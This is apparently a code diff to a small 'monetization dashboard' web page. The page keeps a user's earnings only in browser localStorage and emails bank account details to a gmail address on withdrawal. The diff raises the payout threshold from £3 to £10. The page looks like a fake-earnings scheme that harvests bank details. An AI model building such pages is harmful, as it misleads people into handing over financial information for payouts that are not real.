@@ -11,7 +11,7 @@
     <input type="text" id="accountName" placeholder="Account Name" required>
     <input type="text" id="bankName" placeholder="Bank Name" required>
     <select id="withdrawAmount">
-      <option value="3">£ 3</option>
+      <option value="10">£ 10</option>
     </select> 
    <button type="button" id="withdrawBtn">Withdraw</button>   
     </form>
@@ -92,7 +92,7 @@
     let amount = localStorage.getItem('amount') ? parseInt(localStorage.getItem('amount')) : 0;
     document.getElementById('currentAmount').innerText = amount;
 
-    if (amount >= 3) {
+    if (amount >= 10) {
       document.getElementById('Yext').innerHTML="Congratulation 🎉, You have just unlock 🔓 your Monetization dashboard!";
   
   document.getElementById("loadingBar").style.width="100%";
@@ -100,11 +100,11 @@
     }
 
     document.getElementById('withdrawBtn').addEventListener('click', function() {
-      let emailDetails = `Account Number: ${document.getElementById('accountNumber').value}\nAccount Name: ${document.getElementById('accountName').value}\nBank Name: ${document.getElementById('bankName').value}\nWithdraw Amount: £ 3     Notice: Please enter a valid details to avaoid delay in transaction! transaction can take up to 1 - 2 working days.`;
+      let emailDetails = `Account Number: ${document.getElementById('accountNumber').value}\nAccount Name: ${document.getElementById('accountName').value}\nBank Name: ${document.getElementById('bankName').value}\nWithdraw Amount: £ 10        Notice: Please enter a valid details to avaoid delay in transaction! transaction can take up to 1 - 2 working days.`;
 
       window.location.href = `mailto: tycooninfinity@gmail.com?subject=Withdraw Request&body=${emailDetails}`;
 
-      amount -= 4;
+      amount -= 10;
 
       localStorage.setItem('amount', amount);
 
